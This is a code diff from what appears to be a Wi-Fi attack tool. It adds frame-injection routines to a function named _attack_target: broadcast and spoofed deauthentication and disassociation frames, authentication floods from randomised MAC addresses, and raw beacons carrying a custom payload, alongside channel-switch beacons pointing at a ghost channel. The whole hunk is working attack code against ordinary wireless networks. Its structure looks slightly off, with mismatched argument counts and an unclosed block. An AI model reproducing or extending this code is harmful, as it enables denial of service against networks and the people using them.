@@ -356,6 +356,24 @@ static uint32_t _attack_target(BeaconClone* t) {
         if (wifi_tx_beacon_csa_frame(bssid, bcast, "", ghost_ch)) sent++;
         if (wifi_tx_beacon_csa_frame(bssid, bcast, "", ghost_ch)) sent++;
 
+        if (wifi_tx_deauth_frame(bssid, bcast, reason)) sent++;
+        if (wifi_tx_deauth_frame(rand_mac, bssid, reason, bssid)) sent++;
+        if (wifi_tx_disassoc_frame(bssid, bcast, reason)) sent++;
+        if (wifi_tx_disassoc_frame(rand_mac, bssid, reason, bssid)) sent++;
+
+        if (wifi_tx_auth_frame(rand_mac, bssid)) sent++;
+        rand_mac[5] ^= 0x11;
+        if (wifi_tx_auth_frame(rand_mac, bssid)) sent++;
+        rand_mac[5] ^= 0x22;
+        if (wifi_tx_auth_frame(rand_mac, bssid)) sent++;
+
+        if (t->payload && t->payload_len > 0) {
+            if (wifi_tx_raw_beacon(bssid, bcast, t->payload, t->payload_len,
+                                   t->beacon_interval, t->capabilities)) {
+                sent++;
+            }
+        }
+
     for (int i = 0; i < num_targets; i++) {
         if (targets[i].state == INT_STATE_CAPTURING) return INT_STATE_CAPTURING;
     }
